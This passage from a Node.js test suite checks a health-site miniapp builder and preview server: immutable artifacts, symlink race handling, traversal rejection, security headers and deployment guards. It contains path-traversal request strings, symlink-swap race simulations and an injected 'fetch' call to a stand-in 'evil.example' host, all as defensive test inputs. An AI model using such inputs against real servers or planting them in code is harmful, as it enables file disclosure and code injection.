    () => assertSafeMiniappOutputPath({ projectRoot, outputRoot: '/tmp' }),
    /unsafe miniapp output path/iu,
  );
  assert.equal(
    assertSafeMiniappOutputPath({ projectRoot, outputRoot: join(projectRoot, 'miniapps/dist') }),
    join(projectRoot, 'miniapps/dist'),
  );
});

test('builder reuses an exact verified target without writing or changing its inode', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-immutable-idempotent-'));
  const outputRoot = join(tempRoot, 'dist');

  try {
    const firstManifest = await buildMiniapps({ projectRoot, outputRoot, mode: 'healthy' });
    const firstIdentity = lstatSync(outputRoot);
    assert.equal(firstIdentity.isFile(), true, 'new canonical output is an immutable capsule file');
    const firstParentEntries = readdirSync(tempRoot).sort();
    const candidates = firstParentEntries.filter((name) => /^\.dist-artifact-[a-f0-9]{48}\.capsule$/u.test(name));
    assert.equal(candidates.length, 1, 'one uniquely named immutable candidate is retained');
    const candidateIdentity = lstatSync(join(tempRoot, candidates[0]));
    assert.equal(candidateIdentity.dev, firstIdentity.dev);
    assert.equal(candidateIdentity.ino, firstIdentity.ino);
    assert.equal(firstIdentity.mode & 0o777, 0o400);
    assert.ok(firstIdentity.nlink >= 2);
    const firstBytes = readFileSync(outputRoot);

    const secondManifest = await buildMiniapps({
      projectRoot,
      outputRoot,
      mode: 'healthy',
      beforeFilesystemOperation(details) {
        assert.fail(`idempotent build attempted filesystem mutation: ${details.operation}`);
      },
    });

    const secondIdentity = lstatSync(outputRoot);
    assert.deepEqual(secondManifest, firstManifest);
    assert.equal(secondIdentity.dev, firstIdentity.dev);
    assert.equal(secondIdentity.ino, firstIdentity.ino);
    assert.deepEqual(readdirSync(tempRoot).sort(), firstParentEntries);
    assert.deepEqual(readFileSync(outputRoot), firstBytes);
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('builder publishes with a real exclusive boundary and preserves a concurrent target', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-exclusive-publish-'));
  const outputRoot = join(tempRoot, 'dist');
  let reachedPublishBoundary = false;

  try {
    await assert.rejects(
      buildMiniapps({
        projectRoot,
        outputRoot,
        mode: 'healthy',
        beforeFilesystemOperation({ operation }) {
          if (operation !== 'publish-canonical-artifact') return;
          reachedPublishBoundary = true;
          writeFileSync(outputRoot, 'concurrent target must survive\n', { flag: 'wx' });
        },
      }),
      /exist|publish|concurrent|exclusive/iu,
    );
    assert.equal(reachedPublishBoundary, true);
    assert.equal(readFileSync(outputRoot, 'utf8'), 'concurrent target must survive\n');
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('builder cannot redirect publication when its output ancestor is swapped at the syscall boundary', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-publish-parent-race-'));
  const outputRoot = join(tempRoot, 'dist');
  const displacedRoot = `${tempRoot}.displaced`;
  const outside = mkdtempSync(join(tmpdir(), 'cabohealth-publish-parent-outside-'));
  writeFileSync(join(outside, 'sentinel.txt'), 'outside tree must remain unchanged\n');
  const outsideBefore = byteInventory(outside);
  let reachedPublishBoundary = false;

  try {
    await assert.rejects(
      buildMiniapps({
        projectRoot,
        outputRoot,
        mode: 'healthy',
        beforeFilesystemOperation({ operation }) {
          if (operation !== 'publish-canonical-artifact') return;
          reachedPublishBoundary = true;
          renameSync(tempRoot, displacedRoot);
          symlinkSync(outside, tempRoot, 'dir');
        },
      }),
      /exist|publish|ownership|path|no such file|ENOENT/iu,
    );
    assert.equal(reachedPublishBoundary, true);
    assert.deepEqual(byteInventory(outside), outsideBefore);
    assert.equal(existsSync(join(outside, 'dist')), false);
  } finally {
    if (lstatSync(tempRoot).isSymbolicLink()) unlinkSync(tempRoot);
    if (existsSync(displacedRoot)) renameSync(displacedRoot, tempRoot);
    rmSync(tempRoot, { recursive: true, force: true });
    rmSync(outside, { recursive: true, force: true });
  }
});

test('builder source has no recursive deletion or automatic cleanup API', () => {
  const source = read('scripts/build-miniapps.mjs');
  assert.doesNotMatch(source, /\b(?:rmSync|unlinkSync|rmdirSync|renameSync)\b|\brm\s*\(/u);
  assert.doesNotMatch(source, /recursive\s*:\s*true/u);
});

test('builder rejects symlinked ancestors for canonical and isolated temporary outputs', async () => {
  const { assertSafeMiniappOutputPath } = await import(buildModuleUrl.href);
  const fixtureRoot = mkdtempSync(join(tmpdir(), 'cabohealth-output-ancestors-'));
  const project = join(fixtureRoot, 'project');
  const redirectedMiniapps = join(fixtureRoot, 'redirected-miniapps');
  const isolated = join(fixtureRoot, 'isolated');
  const redirectedOutput = join(fixtureRoot, 'redirected-output');
  mkdirSync(project);
  mkdirSync(redirectedMiniapps);
  mkdirSync(isolated);
  mkdirSync(redirectedOutput);
  symlinkSync(redirectedMiniapps, join(project, 'miniapps'), 'dir');
  symlinkSync(redirectedOutput, join(isolated, 'linked-parent'), 'dir');

  try {
    assert.throws(
      () => assertSafeMiniappOutputPath({
        projectRoot: project,
        outputRoot: join(project, 'miniapps/dist'),
      }),
      /symlink|real path|unsafe/iu,
    );
    assert.throws(
      () => assertSafeMiniappOutputPath({
        projectRoot: project,
        outputRoot: join(isolated, 'linked-parent/dist'),
      }),
      /symlink|real path|unsafe/iu,
    );
  } finally {
    rmSync(fixtureRoot, { recursive: true, force: true });
  }
});

test('builder preserves an existing invalid target and fails without creating a candidate', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-invalid-target-'));
  const outputRoot = join(tempRoot, 'dist');
  mkdirSync(outputRoot);
  writeFileSync(join(outputRoot, 'sentinel.txt'), 'untrusted target must survive\n');
  const before = byteInventory(tempRoot);

  try {
    await assert.rejects(
      buildMiniapps({ projectRoot, outputRoot, mode: 'healthy' }),
      /artifact|manifest|file set|verification/iu,
    );
    assert.deepEqual(byteInventory(tempRoot), before);
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('builder keeps an exact legacy directory artifact unchanged and performs no mutation', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-legacy-idempotent-'));
  const outputRoot = join(tempRoot, 'dist');

  try {
    await materializeHealthyDirectory(outputRoot);
    const before = byteInventory(outputRoot);
    const identity = lstatSync(outputRoot);
    await buildMiniapps({
      projectRoot,
      outputRoot,
      mode: 'healthy',
      beforeFilesystemOperation({ operation }) {
        assert.fail(`legacy idempotence attempted mutation: ${operation}`);
      },
    });
    const after = lstatSync(outputRoot);
    assert.equal(after.dev, identity.dev);
    assert.equal(after.ino, identity.ino);
    assert.deepEqual(byteInventory(outputRoot), before);
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('abandoned immutable candidates and legacy stages never wedge a later build and are preserved', async () => {
  const { buildMiniapps, verifyBuiltArtifact } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-abandoned-artifact-'));
  const outputRoot = join(tempRoot, 'dist');
  const abandoned = join(tempRoot, '.dist-artifact-000000000000000000000000000000000000000000000000.capsule');
  const legacyStage = join(tempRoot, '.dist-stage');
  writeFileSync(abandoned, 'interrupted immutable candidate\n');
  mkdirSync(legacyStage);
  writeFileSync(join(legacyStage, 'sentinel.txt'), 'legacy stage must survive\n');

  try {
    await buildMiniapps({ projectRoot, outputRoot, mode: 'healthy' });
    assert.equal(readFileSync(abandoned, 'utf8'), 'interrupted immutable candidate\n');
    assert.equal(readFileSync(join(legacyStage, 'sentinel.txt'), 'utf8'), 'legacy stage must survive\n');
    assert.equal(verifyBuiltArtifact({ projectRoot, outputRoot }), true);
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('canonical builds ignore but never modify an abandoned immutable candidate at the miniapps root', async () => {
  const { buildMiniapps, verifyBuiltArtifact } = await import(buildModuleUrl.href);
  const fixtureRoot = createTask6ASourceFixture('cabohealth-canonical-abandoned-');
  const miniappsRoot = join(fixtureRoot, 'miniapps');
  const outputRoot = join(miniappsRoot, 'dist');
  const abandoned = join(miniappsRoot, '.dist-artifact-111111111111111111111111111111111111111111111111.capsule');
  writeFileSync(abandoned, '', { mode: 0o600 });

  try {
    await buildMiniapps({ projectRoot: fixtureRoot, outputRoot, mode: 'healthy' });
    assert.equal(readFileSync(abandoned, 'utf8'), '');
    assert.equal(verifyBuiltArtifact({ projectRoot: fixtureRoot, outputRoot }), true);
  } finally {
    rmSync(fixtureRoot, { recursive: true, force: true });
  }
});

test('source inventory rejects disguised candidate data and legacy stage contents without modifying them', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  for (const kind of ['candidate', 'legacy-stage']) {
    const fixtureRoot = createTask6ASourceFixture(`cabohealth-invalid-residue-${kind}-`);
    const miniappsRoot = join(fixtureRoot, 'miniapps');
    const outputRoot = join(miniappsRoot, 'dist');
    const residue = kind === 'candidate'
      ? join(miniappsRoot, '.dist-artifact-222222222222222222222222222222222222222222222222.capsule')
      : join(miniappsRoot, '.dist-stage/sentinel.txt');
    mkdirSync(dirname(residue), { recursive: true });
    writeFileSync(residue, 'unrelated or private data must not be hidden here\n', { mode: 0o600 });

    try {
      await assert.rejects(
        buildMiniapps({ projectRoot: fixtureRoot, outputRoot, mode: 'healthy' }),
        /candidate[_ ]residue|source[_ ]inventory|source roots/iu,
      );
      assert.equal(readFileSync(residue, 'utf8'), 'unrelated or private data must not be hidden here\n');
      assert.equal(existsSync(outputRoot), false);
    } finally {
      rmSync(fixtureRoot, { recursive: true, force: true });
    }
  }
});

test('source inventory rejects stage-like names nested inside reviewed sources', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const nestedStageName = join(projectRoot, 'miniapps/shared/.dist-stage');
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-nested-stage-name-'));
  mkdirSync(nestedStageName);
  writeFileSync(join(nestedStageName, 'unexpected.txt'), 'must be inventoried\n');
  try {
    await assert.rejects(
      buildMiniapps({ projectRoot, outputRoot: join(tempRoot, 'dist'), mode: 'healthy' }),
      /source[_ ]inventory/iu,
    );
  } finally {
    rmSync(nestedStageName, { recursive: true, force: true });
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('network motion policy caps rendering and stops its single scheduler cleanly', async () => {
  const motionSource = read('miniapps/shared/motion.js');
  const {
    computeCanvasBackingStore,
    createFrameScheduler,
    deriveNetworkMotionState,
  } = await import(`data:text/javascript;base64,${Buffer.from(motionSource).toString('base64')}`);

  assert.equal(deriveNetworkMotionState({ ready: true, pageVisible: true, effectVisible: true, pausedByUser: false, reducedMotion: false, saveData: false }), 'playing');
  assert.equal(deriveNetworkMotionState({ ready: true, pageVisible: true, effectVisible: true, pausedByUser: true, reducedMotion: false, saveData: false }), 'paused');
  assert.equal(deriveNetworkMotionState({ ready: true, pageVisible: false, effectVisible: true, pausedByUser: false, reducedMotion: false, saveData: false }), 'waiting');
  assert.equal(deriveNetworkMotionState({ ready: true, pageVisible: true, effectVisible: true, pausedByUser: false, reducedMotion: true, saveData: false }), 'blocked');
  assert.equal(deriveNetworkMotionState({ ready: true, pageVisible: true, effectVisible: true, pausedByUser: false, reducedMotion: false, saveData: true }), 'blocked');

  assert.deepEqual(computeCanvasBackingStore({ cssWidth: 400, cssHeight: 200, devicePixelRatio: 3 }), {
    width: 600,
    height: 300,
    scale: 1.5,
  });
  const constrained = computeCanvasBackingStore({ cssWidth: 2400, cssHeight: 1600, devicePixelRatio: 3 });
  assert.ok(constrained.scale <= 1.5);
  assert.ok(constrained.width * constrained.height <= 1_500_000);

  let nextId = 0;
  const callbacks = new Map();
  const draws = [];
  const canceled = [];
  const scheduler = createFrameScheduler({
    targetFps: 30,
    canRender: () => true,
    draw: ({ now, deltaMs }) => draws.push({ now, deltaMs }),
    requestFrame: (callback) => {
      const id = ++nextId;
      callbacks.set(id, callback);
      return id;
    },
    cancelFrame: (id) => {
      canceled.push(id);
      callbacks.delete(id);
    },
  });
  const present = (now) => {
    const [id, callback] = callbacks.entries().next().value;
    callbacks.delete(id);
    callback(now);
  };

  scheduler.start();
  present(0);
  present(10);
  present(34);
  present(1000);
  assert.deepEqual(draws.map(({ now }) => now), [0, 34, 1000]);
  assert.ok(draws.every(({ deltaMs }) => deltaMs <= 50));
  assert.equal(callbacks.size, 1, 'scheduler must own one pending frame');
  scheduler.stop();
  assert.equal(callbacks.size, 0);
  assert.equal(canceled.length, 1);
});

test('network motion mounts one canvas owner and releases every runtime resource', async () => {
  class FakeEventTarget {
    constructor() {
      this.listeners = new Map();
    }

    addEventListener(type, listener) {
      const listeners = this.listeners.get(type) ?? new Set();
      listeners.add(listener);
      this.listeners.set(type, listeners);
    }

    removeEventListener(type, listener) {
      this.listeners.get(type)?.delete(listener);
    }

    listenerCount() {
      return [...this.listeners.values()].reduce((total, listeners) => total + listeners.size, 0);
    }
  }

  const motionSource = read('miniapps/shared/motion.js');
  const { mountNetworkMotion } = await import(`data:text/javascript;base64,${Buffer.from(motionSource).toString('base64')}`);
  const toggle = new FakeEventTarget();
  const status = { textContent: '' };
  const context = {
    setTransform() {}, clearRect() {}, beginPath() {}, moveTo() {}, lineTo() {}, stroke() {}, arc() {}, fill() {},
  };
  const canvas = {
    width: 0,
    height: 0,
    getContext: () => context,
    getBoundingClientRect: () => ({ width: 400, height: 200 }),
  };
  const media = Object.assign(new FakeEventTarget(), { matches: false });
  const connection = Object.assign(new FakeEventTarget(), { saveData: false });
  const view = Object.assign(new FakeEventTarget(), {
    devicePixelRatio: 3,
    navigator: { connection },
    matchMedia: () => media,
  });
  let nextFrame = 0;
  const frames = new Map();
  const canceled = [];
  view.requestAnimationFrame = (callback) => {
    const id = ++nextFrame;
    frames.set(id, callback);
    return id;
  };
  view.cancelAnimationFrame = (id) => {
    canceled.push(id);
    frames.delete(id);
  };
  let observerCallback;
  let disconnects = 0;
  view.IntersectionObserver = class {
    constructor(callback) {
      observerCallback = callback;
    }

    observe() {}

    disconnect() {
      disconnects += 1;
    }
  };
  const page = Object.assign(new FakeEventTarget(), {
    defaultView: view,
    hidden: false,
    querySelector: (selector) => ({
      '[data-network-canvas]': canvas,
      '[data-motion-toggle]': toggle,
      '[data-motion-status]': status,
    })[selector] ?? null,
  });

  const controller = mountNetworkMotion({ document: page, language: () => 'en' });
  assert.equal(mountNetworkMotion({ document: page, language: () => 'en' }), controller);
  observerCallback([{ target: canvas, isIntersecting: true, intersectionRatio: 1 }]);
  assert.equal(frames.size, 1);
  assert.deepEqual({ width: canvas.width, height: canvas.height }, { width: 600, height: 300 });

  controller.destroy();
  assert.equal(frames.size, 0);
  assert.equal(canceled.length, 1);
  assert.equal(disconnects, 1);
  assert.equal(toggle.listenerCount(), 0);
  assert.equal(page.listenerCount(), 0);
  assert.equal(media.listenerCount(), 0);
  assert.equal(connection.listenerCount(), 0);
  assert.equal(view.listenerCount(), 0);
  assert.deepEqual({ width: canvas.width, height: canvas.height }, { width: 1, height: 1 });
});

test('persisted BFCache pagehide preserves controllers and final pagehide tears them down once', async () => {
  class FakeView {
    constructor() {
      this.listeners = new Map();
    }

    addEventListener(type, listener) {
      const listeners = this.listeners.get(type) ?? new Set();
      listeners.add(listener);
      this.listeners.set(type, listeners);
    }

    removeEventListener(type, listener) {
      this.listeners.get(type)?.delete(listener);
    }

    dispatch(type, event) {
      for (const listener of this.listeners.get(type) ?? []) listener(event);
    }

    listenerCount(type) {
      return this.listeners.get(type)?.size ?? 0;
    }
  }

  const shellSource = read('miniapps/shared/shell.js');
  const { mountPageLifecycle } = await import(`data:text/javascript;base64,${Buffer.from(shellSource).toString('base64')}`);
  const view = new FakeView();
  let destroys = 0;
  const lifecycle = mountPageLifecycle({ view, onDestroy: () => { destroys += 1; } });

  view.dispatch('pagehide', { persisted: true });
  view.dispatch('pageshow', { persisted: true });
  assert.equal(destroys, 0);
  assert.equal(view.listenerCount('pagehide'), 1);

  view.dispatch('pagehide', { persisted: false });
  assert.equal(destroys, 1);
  assert.equal(view.listenerCount('pagehide'), 0);
  lifecycle.destroy();
  assert.equal(destroys, 1);
});

test('enhanced English and Spanish modes keep a visible h1 and localize exact legal actions', async () => {
  class FakeElement {
    constructor(dataset = {}) {
      this.dataset = dataset;
      this.attributes = new Map();
      this.disabled = false;
      this.hidden = false;
      this.label = null;
    }

    addEventListener() {}
    removeEventListener() {}
    setAttribute(name, value) { this.attributes.set(name, value); }
    getAttribute(name) { return this.attributes.get(name) ?? null; }
    querySelector(selector) { return selector === '[data-external-label]' ? this.label : null; }
  }

  const shellSource = read('miniapps/shared/shell.js');
  const { mountShell } = await import(`data:text/javascript;base64,${Buffer.from(shellSource).toString('base64')}`);
  const heading = new FakeElement();
  const englishTitle = new FakeElement({ locale: 'en' });
  const spanishTitle = new FakeElement({ locale: 'es-MX' });
  heading.children = [englishTitle, spanishTitle];
  const englishButton = new FakeElement({ language: 'en' });
  const spanishButton = new FakeElement({ language: 'es-MX' });
  const privacy = new FakeElement({
    externalAction: '',
    labelEn: 'Privacy',
    labelEs: 'Privacidad',
  });
  privacy.label = { textContent: 'Privacy / Privacidad' };
  const documentElement = { dataset: {}, lang: 'en' };
  const page = {
    contains: () => true,
    defaultView: {},
    dispatchEvent() {},
    documentElement,
    querySelector: (selector) => selector === 'h1' ? heading : null,
    querySelectorAll(selector) {
      return {
        '[data-external-action]': [privacy],
        '[data-language]': [englishButton, spanishButton],
        '[data-locale]': [englishTitle, spanishTitle],
      }[selector] ?? [];
    },
  };

  const shell = mountShell({ document: page, storage: null });
  assert.equal(page.querySelector('h1').hidden, false);
  assert.deepEqual(page.querySelector('h1').children, [englishTitle, spanishTitle]);
  assert.equal(englishTitle.hidden, false);
  assert.equal(spanishTitle.hidden, true);
  assert.equal(privacy.label.textContent, 'Privacy');
  assert.equal(privacy.getAttribute('aria-label'), 'Privacy. Opens outside CaboHealth');

  shell.setLanguage('es-MX', { announce: false });
  assert.equal(heading.hidden, false);
  assert.equal(englishTitle.hidden, true);
  assert.equal(spanishTitle.hidden, false);
  assert.equal(privacy.label.textContent, 'Privacidad');
  assert.equal(privacy.getAttribute('aria-label'), 'Privacidad. Se abre fuera de CaboHealth');
  shell.destroy();
});

test('static request resolver serves only built local files and rejects traversal or absent routes', async () => {
  const { resolveStaticRequest } = await import(serveModuleUrl.href);
  await withHealthyBuild(async (outputRoot) => {
    assert.equal(
      resolveStaticRequest(outputRoot, '/apps/healthy-recipes/'),
      join(outputRoot, 'apps/healthy-recipes/index.html'),
    );
    assert.equal(resolveStaticRequest(outputRoot, '/apps/clinic-guide/'), null);
    assert.equal(resolveStaticRequest(outputRoot, '/../../release/public-contact-facts.json'), null);
    assert.equal(resolveStaticRequest(outputRoot, '/%2e%2e/%2e%2e/package.json'), null);
    assert.equal(resolveStaticRequest(outputRoot, '/apps/%2e%2e/manifest.json'), null);
    assert.equal(resolveStaticRequest(outputRoot, '//evil.example/x'), null);
  });
});

test('static request resolver rejects symlinked intermediate directories and realpath escapes', async () => {
  const { resolveStaticRequest } = await import(serveModuleUrl.href);
  await withHealthyBuild(async (outputRoot) => {
    const outside = mkdtempSync(join(tmpdir(), 'cabohealth-preview-outside-'));
    const shared = join(outputRoot, 'apps/shared');
    writeFileSync(join(outside, 'secret.txt'), 'outside\n');
    rmSync(shared, { recursive: true, force: true });
    symlinkSync(outside, shared, 'dir');
    try {
      assert.equal(resolveStaticRequest(outputRoot, '/apps/shared/secret.txt'), null);
    } finally {
      rmSync(shared, { force: true });
      rmSync(outside, { recursive: true, force: true });
    }
  });
});

test('static request resolver rejects symlinked artifact roots and final files', async () => {
  const { resolveStaticRequest } = await import(serveModuleUrl.href);
  await withHealthyBuild(async (outputRoot) => {
    const outside = mkdtempSync(join(tmpdir(), 'cabohealth-preview-final-outside-'));
    const rootAlias = join(outside, 'root-alias');
    const outsideFile = join(outside, 'outside.js');
    const appPath = join(outputRoot, 'apps/healthy-recipes/app.js');
    symlinkSync(outputRoot, rootAlias, 'dir');
    writeFileSync(outsideFile, 'outside\n');
    unlinkSync(appPath);
    symlinkSync(outsideFile, appPath, 'file');
    try {
      assert.equal(resolveStaticRequest(rootAlias, '/apps/healthy-recipes/index.html'), null);
      assert.equal(resolveStaticRequest(outputRoot, '/apps/healthy-recipes/app.js'), null);
    } finally {
      rmSync(rootAlias, { force: true });
      rmSync(outside, { recursive: true, force: true });
    }
  });
});

test('preview refuses a missing or non-release-safe manifest before creating a server', async () => {
  const { createMiniappsServer } = await import(serveModuleUrl.href);
  await withHealthyBuild(async (outputRoot) => {
    const manifestPath = join(outputRoot, 'manifest.json');
    const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'));
    writeFileSync(manifestPath, `${JSON.stringify({ ...manifest, releaseReady: true }, null, 2)}\n`);
    assert.throws(
      () => createMiniappsServer({ projectRoot, root: outputRoot }),
      /manifest|verification|release/iu,
    );
  });
});

test('preview serves an immutable verified snapshot even if artifact files change afterward', async () => {
  const { loadVerifiedArtifactSnapshot } = await import(serveModuleUrl.href);
  await withHealthyBuild(async (outputRoot) => {
    const appPath = join(outputRoot, 'apps/healthy-recipes/app.js');
    const original = readFileSync(appPath);
    const snapshot = loadVerifiedArtifactSnapshot({ projectRoot, root: outputRoot });
    writeFileSync(appPath, 'globalThis["fetch"]("https://evil.example/");\n');
    assert.deepEqual(snapshot.read('/apps/healthy-recipes/app.js'), original);
    assert.equal(snapshot.read('/apps/clinic-guide/'), null);
  });
});

test('preview reads the immutable capsule and exposes only reviewed Healthy Recipes files', async () => {
  const { buildMiniapps, readVerifiedMiniappArtifact } = await import(buildModuleUrl.href);
  const { loadVerifiedArtifactSnapshot } = await import(serveModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-capsule-preview-'));
  const outputRoot = join(tempRoot, 'dist');

  try {
    await buildMiniapps({ projectRoot, outputRoot, mode: 'healthy' });
    const artifact = readVerifiedMiniappArtifact({ projectRoot, outputRoot });
    const snapshot = loadVerifiedArtifactSnapshot({ projectRoot, root: outputRoot });
    assert.deepEqual(
      snapshot.read('/apps/healthy-recipes/index.html'),
      artifact.files.get('apps/healthy-recipes/index.html'),
    );
    assert.equal(snapshot.read('/apps/clinic-guide/index.html'), null);
    assert.equal(snapshot.read('/manifest.json'), null);
    assert.equal(snapshot.read('/apps/.htaccess'), null);
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('capsule verifier rejects truncation, embedded manifest drift, and embedded file tampering', async () => {
  const { buildMiniapps, verifyBuiltArtifact } = await import(buildModuleUrl.href);
  const mutations = [
    ['truncated capsule', (bytes) => bytes.subarray(0, Math.max(1, bytes.byteLength - 37))],
    ['embedded manifest drift', (bytes) => {
      const capsule = JSON.parse(bytes.toString('utf8'));
      capsule.manifest.releaseReady = true;
      return Buffer.from(`${JSON.stringify(capsule, null, 2)}\n`);
    }],
    ['embedded file tampering', (bytes) => {
      const capsule = JSON.parse(bytes.toString('utf8'));
      capsule.files[0].bytesBase64 = `${capsule.files[0].bytesBase64.slice(0, -1)}A`;
      return Buffer.from(`${JSON.stringify(capsule, null, 2)}\n`);
    }],
  ];

  for (const [label, mutate] of mutations) {
    const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-capsule-mutation-'));
    const outputRoot = join(tempRoot, 'dist');
    try {
      await buildMiniapps({ projectRoot, outputRoot, mode: 'healthy' });
      assert.equal(verifyBuiltArtifact({ projectRoot, outputRoot }), true);
      const original = readFileSync(outputRoot);
      chmodSync(outputRoot, 0o600);
      writeFileSync(outputRoot, mutate(original));
      assert.throws(
        () => verifyBuiltArtifact({ projectRoot, outputRoot }),
        /capsule|artifact|mismatch|verification/iu,
        label,
      );
    } finally {
      rmSync(tempRoot, { recursive: true, force: true });
    }
  }
});

test('capsule preview fails closed when canonical bytes change after initial verification', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const { loadVerifiedArtifactSnapshot } = await import(serveModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-capsule-preview-race-'));
  const outputRoot = join(tempRoot, 'dist');
  let replacementRan = false;

  try {
    await buildMiniapps({ projectRoot, outputRoot, mode: 'healthy' });
    assert.throws(
      () => loadVerifiedArtifactSnapshot({
        projectRoot,
        root: outputRoot,
        afterArtifactVerification() {
          replacementRan = true;
          chmodSync(outputRoot, 0o600);
          const bytes = readFileSync(outputRoot);
          writeFileSync(outputRoot, bytes.subarray(0, bytes.byteLength - 1));
        },
      }),
      /capsule|artifact|mismatch|verification|changed/iu,
    );
    assert.equal(replacementRan, true);
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('preview fails closed when the artifact is replaced after initial verification', async () => {
  const { loadVerifiedArtifactSnapshot } = await import(serveModuleUrl.href);
  await withHealthyBuild(async (outputRoot) => {
    let replacementRan = false;
    assert.throws(
      () => loadVerifiedArtifactSnapshot({
        projectRoot,
        root: outputRoot,
        afterArtifactVerification() {
          replacementRan = true;
          const clinicRelativePath = 'apps/clinic-guide/index.html';
          const clinicBytes = Buffer.from('<!doctype html><title>Unreviewed Clinic</title>\n');
          const clinicPath = join(outputRoot, clinicRelativePath);
          mkdirSync(dirname(clinicPath), { recursive: true });
          writeFileSync(clinicPath, clinicBytes);
          const manifestPath = join(outputRoot, 'manifest.json');
          const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'));
          manifest.files = [...manifest.files, {
            path: clinicRelativePath,
            size: clinicBytes.byteLength,
            sha256: createHash('sha256').update(clinicBytes).digest('hex'),
          }].sort((left, right) => left.path.localeCompare(right.path));
          writeFileSync(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`);
        },
      }),
      /artifact|file set|verification|changed/iu,
    );

    assert.equal(replacementRan, true);
  });
});

test('preview sends the exact security headers for success and error responses', async () => {
  const { createMiniappsServer } = await import(serveModuleUrl.href);
  await withHealthyBuild(async (outputRoot) => {
    const server = createMiniappsServer({ projectRoot, root: outputRoot });
    const expected = {
      'content-security-policy': "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'none'; font-src 'self'; frame-src 'none'; object-src 'none'; form-action 'none'; base-uri 'none'; worker-src 'none'; media-src 'none'",
      'permissions-policy': 'camera=(), microphone=(), geolocation=(), payment=(), usb=()',
      'referrer-policy': 'no-referrer',
      'x-content-type-options': 'nosniff',
      'x-frame-options': 'DENY',
    };
    for (const [method, path, status] of [
      ['GET', '/apps/healthy-recipes/', 200],
      ['HEAD', '/apps/healthy-recipes/', 200],
      ['GET', '/absent', 404],
      ['POST', '/apps/healthy-recipes/', 405],
    ]) {
      const recorded = { body: undefined, headers: {}, status: 0 };
      const response = {
        writeHead(nextStatus, headers) {
          recorded.status = nextStatus;
          recorded.headers = Object.fromEntries(Object.entries(headers).map(([name, value]) => [name.toLowerCase(), value]));
        },
        end(body) {
          recorded.body = body;
        },
      };
      server.emit('request', { method, url: path }, response);
      assert.equal(recorded.status, status);
      assert.deepEqual(
        Object.fromEntries(Object.keys(expected).map((name) => [name, recorded.headers[name]])),
        expected,
      );
      if (method === 'HEAD') assert.equal(recorded.body, undefined);
    }
  });
});

test('deployment source guard accepts only a verified canonical static tree and refuses capsules or source templates', async () => {
  const { assertVerifiedMiniappDeploymentSource, buildMiniapps } = await import(buildModuleUrl.href);
  const directoryFixture = createTask6ASourceFixture('cabohealth-deploy-directory-');
  const capsuleFixture = createTask6ASourceFixture('cabohealth-deploy-capsule-');
  const directoryDist = join(directoryFixture, 'miniapps/dist');
  const capsuleDist = join(capsuleFixture, 'miniapps/dist');
  try {
    await materializeHealthyDirectory(directoryDist, directoryFixture);
    assert.equal(
      assertVerifiedMiniappDeploymentSource({ projectRoot: directoryFixture, outputRoot: directoryDist }),
      realpathSync(directoryDist),
    );
    assert.throws(
      () => assertVerifiedMiniappDeploymentSource({
        projectRoot: directoryFixture,
        outputRoot: join(directoryFixture, 'miniapps/clinic-guide'),
      }),
      /canonical|verified|deployment|unsafe/iu,
    );

    await buildMiniapps({ projectRoot: capsuleFixture, outputRoot: capsuleDist, mode: 'healthy' });
    assert.throws(
      () => assertVerifiedMiniappDeploymentSource({ projectRoot: capsuleFixture, outputRoot: capsuleDist }),
      /reviewed materialization|not a deployable static directory/iu,
    );
  } finally {
    rmSync(directoryFixture, { recursive: true, force: true });
    rmSync(capsuleFixture, { recursive: true, force: true });
  }
});

test('package scripts keep the full release build gated and expose the independently green slice', () => {
  const scripts = readJson('package.json').scripts;
  assert.equal(scripts['miniapps:build'], 'node scripts/build-miniapps.mjs --release');
  assert.equal(scripts['miniapps:build:healthy'], 'node scripts/build-miniapps.mjs --healthy');
  assert.equal(scripts['miniapps:serve'], 'node scripts/serve-miniapps.mjs');
  assert.equal(scripts['miniapps:verify'], 'node --test tests/miniapps-content.test.mjs tests/miniapps-build.test.mjs');
  assert.doesNotMatch(
    read('scripts/serve-miniapps.mjs'),
    /assertVerifiedMiniappDeploymentSource/u,
    'local preview must verify and snapshot capsules without invoking a deployment-only guard',
  );
});
